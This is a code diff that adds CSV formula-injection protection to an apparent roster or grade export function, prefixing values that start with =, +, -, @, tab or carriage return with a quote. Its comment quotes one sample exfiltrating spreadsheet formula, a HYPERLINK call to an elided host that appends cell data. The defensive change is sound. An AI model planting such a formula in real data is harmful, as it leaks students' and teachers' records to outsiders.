@@ -25,9 +25,18 @@ export const HEADER_MAX = 30;
 /**
  * RFC-4180 quoting, with the separator of this file. A field is quoted only
  * when it has to be, so a plain export stays diff-readable.
+ *
+ * A field that a spreadsheet would read as a FORMULA is prefixed with a
+ * single quote first. Names and emails come from the roster import and from
+ * the identity provider's claims, so `=HYPERLINK("http://…"&A1)` in a family
+ * name is a grade sheet walking out of the teacher's Excel; quoting does not
+ * stop that, the prefix does, and Excel does not display it.
  */
+const FORMULA_LEAD = new Set(["=", "+", "-", "@", "\t", "\r"]);
+
 export function csvField(value: string): string {
-  return /[";\r\n]/.test(value) ? `"${value.replaceAll('"', '""')}"` : value;
+  const safe = FORMULA_LEAD.has(value.slice(0, 1)) ? `'${value}` : value;
+  return /[";\r\n]/.test(safe) ? `"${safe.replaceAll('"', '""')}"` : safe;
 }
 
 const line = (fields: readonly string[]): string => fields.map(csvField).join(SEPARATOR);
